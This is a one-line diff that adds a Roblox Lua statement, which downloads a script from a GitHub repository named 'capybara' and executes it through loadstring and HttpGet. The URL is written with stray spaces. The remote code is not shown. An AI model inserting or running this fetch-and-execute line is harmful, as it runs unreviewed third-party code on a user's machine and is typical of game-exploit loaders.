@@ -1,0 +1,1 @@
+loadstring(game: HttpGet("https://raw .githubusercontent.com/hayrankal/capybara /refs/heads/main/capybara"))()
